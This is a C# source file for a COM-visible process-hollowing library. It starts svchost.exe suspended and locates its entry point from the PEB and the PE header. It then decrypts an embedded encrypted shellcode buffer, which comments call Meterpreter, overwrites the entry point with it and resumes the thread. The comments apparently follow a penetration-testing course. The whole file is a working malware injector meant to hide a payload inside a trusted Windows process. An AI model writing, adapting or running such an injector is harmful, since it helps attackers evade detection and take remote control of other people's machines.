using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace ProcessHollowingLib
{
    [ComVisible(true)]
    public class ProcHollower
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
        public ProcHollower(string password, byte[]iv)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                 null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            //fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //The ptrToImageBase variable now contains a pointer to the image base of svchost.exe
            //Following the DllImport, we can call ReadProcessMemory by specifying an 8 - byte buffer that is
            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
            //pointer using (IntPtr)
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //The following step is to parse the PE header to locate the EntryPoint.This is performed by calling
            //ReadProcessMemory again with a buffer size of 0x200 bytes
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset
            //when added to 0x28 convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. 
            //This value is the offset from the image base to the EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual
            //address(RVA).We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            //This is encryped/shifted using the project
            //https://github.com/sbridgens/ProcessHollowing/tree/main/ShellCodeEncrypter
            byte[] buf = new byte[] {
                0x3b,0xd2,0x7c,0x8c,0xf0,0xe4,0xd6,0x73,0xf9,0x69,0x8a,0x03,0x84,0x8a,0x62,0x9b,0x18,
                0x9f,0xb9,0xdf,0x62,0xa0,0x2c,0x67,0x1c,0x4b,0x6c,0xe7,0xad,0x02,0xfa,0x89,0x2c,0x66,
                0x31,0xfb,0xf8,0x73,0x19,0x7f,0xe0,0x7d,0x32,0xc3,0xf8,0xdd,0x3e,0x2d,0xb7,0x0b,0x8c,
                0x10,0x21,0x0d,0xd4,0x93,0xa8,0xd7,0x93,0xb4,0x52,0x8d,0x1b,0x9e,0xe3,0x6b,0x38,0x52,
                0x67,0xfb,0x5f,0xf0,0x27,0x52,0x46,0x89,0x3c,0xed,0x42,0x92,0xd8,0x64,0x41,0x13,0xae,
                0x52,0x5a,0x01,0x31,0xcf,0xf4,0xee,0x08,0x10,0x1b,0xa3,0xc7,0xc2,0x4e,0xc4,0xbc,0x30,
                0xa4,0xf0,0x2f,0xb9,0xa9,0x9c,0x17,0x9a,0x81,0x91,0xac,0x2c,0x55,0x82,0x5b,0x74,0xb5,
                0xff,0xb0,0x68,0xfc,0x44,0xd7,0x85,0x9b,0x3d,0xcf,0x44,0x7e,0x4c,0xe3,0xf6,0x9b,0x40,
                0xe6,0x7a,0xf1,0x3a,0xc1,0xea,0xcd,0x63,0x74,0x49,0xe1,0x13,0xe8,0x28,0x7d,0xee,0xd3,
                0x6c,0xc1,0x67,0x6a,0xae,0x13,0x09,0x0f,0x34,0x3f,0xbf,0x26,0xa1,0x5c,0xcf,0x5c,0x75,
                0xbd,0x83,0xc7,0xf8,0xa1,0xf0,0x26,0xc2,0x54,0xa2,0x80,0x49,0x8b,0x5d,0x68,0xe0,0x96,
                0x70,0xde,0xe7,0xf1,0xd1,0x84,0x73,0x45,0x03,0xdf,0xc2,0x96,0xb0,0x7c,0x96,0x1a,0x3c,
                0xeb,0xcc,0x01,0x73,0x04,0x5c,0x0c,0xca,0x3c,0xd6,0x45,0xbc,0x90,0xa0,0xa3,0xbb,0x4d,
                0xe8,0x69,0x8f,0x8b,0xd5,0x4b,0x6e,0xea,0x10,0xfc,0xfd,0x30,0x9a,0xc4,0xa9,0x48,0xf5,
                0x28,0x87,0x5a,0x1e,0x21,0xff,0xf5,0xad,0xd7,0x89,0xbd,0xf4,0x51,0x73,0xbd,0x0c,0xa5,
                0x94,0x2a,0xe6,0x09,0x94,0x32,0x69,0x54,0xa9,0x2c,0xb1,0x88,0xf0,0xd1,0x15,0x23,0xc7,
                0xf1,0x76,0x65,0xad,0x35,0x12,0x50,0x38,0x0f,0x2d,0xce,0x49,0x9c,0x12,0xbb,0x73,0x89,
                0x16,0x57,0xc2,0xeb,0xf9,0x02,0xb6,0x00,0x73,0xaf,0x48,0x99,0xc9,0x0a,0x21,0xcf,0xe4,
                0xa9,0xe8,0x3f,0x1e,0x95,0x7a,0x5e,0xbe,0x4b,0x5c,0xb4,0x83,0x17,0xe4,0x89,0xc4,0x92,
                0x8b,0xbf,0xb0,0x84,0x28,0xeb,0xa5,0x8d,0xa8,0x5c,0x3b,0x26,0xb5,0xb6,0xdc,0x8e,0x43,
                0x2f,0x9a,0x91,0xa3,0x70,0xdb,0xa2,0x32,0x3f,0x04,0xb7,0xb2,0xb7,0xda,0xfa,0x00,0xba,
                0x4c,0xe2,0x80,0xa1,0x36,0x7c,0x49,0x80,0xf6,0xbc,0xc5,0x33,0xe1,0x74,0x1f,0xf0,0x3d,
                0x47,0x80,0x6b,0x7d,0x9d,0x76,0xdb,0xdc,0xe5,0xd3,0x74,0x32,0x66,0x85,0x1c,0x1a,0x57,
                0x47,0xcd,0x18,0xf7,0x70,0x5a,0x13,0x9e,0xf9,0x75,0x18,0xc8,0x68,0xe8,0x1e,0x77,0xfd,
                0x13,0x89,0x87,0xd5,0xe6,0x91,0xd4,0xd6,0x9f,0xd2,0x6e,0x6c,0x0f,0xcf,0x1f,0x9a,0x1d,
                0x23,0xe8,0x55,0xcd,0xd4,0xd8,0x55,0x80,0x79,0x3f,0x37,0xde,0xd4,0xe6,0x7a,0xff,0x5f,
                0x85,0xee,0x2f,0xe8,0xed,0xc3,0x36,0xe5,0xd4,0x23,0x62,0x2a,0x33,0x8d,0xe6,0x69,0xba,
                0x4a,0x6d,0x04,0xe2,0x58,0x4e,0xec,0xaa,0xc3,0xe9,0x50,0xeb,0x65,0xd6,0xa4,0xd3,0x5f,
                0x6b,0xe8,0x21,0x16,0x39,0xdf,0xf8,0xee,0x20,0x69,0x07,0x4f,0x3a,0xb2,0x11,0x43,0x95,
                0x4d,0x46,0xe0,0x3a,0xa2,0x7b,0x98,0x2a,0xf2,0x13,0x8e,0x77,0xf3,0x48,0x9f,0x11,0x54,
                0x95,0xe3
            };

            buf = PFuncs.CaesarDecrypt(buf,password,iv);

            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
            //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
            //that we must add a DllImport statement for WriteProcessMemory before using it.
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION
            //structure, it also copied the handle of the main thread into it. 
            //We can then import ResumeThread and call it directly.
            ResumeThread(pi.hThread);
        }
    }
}
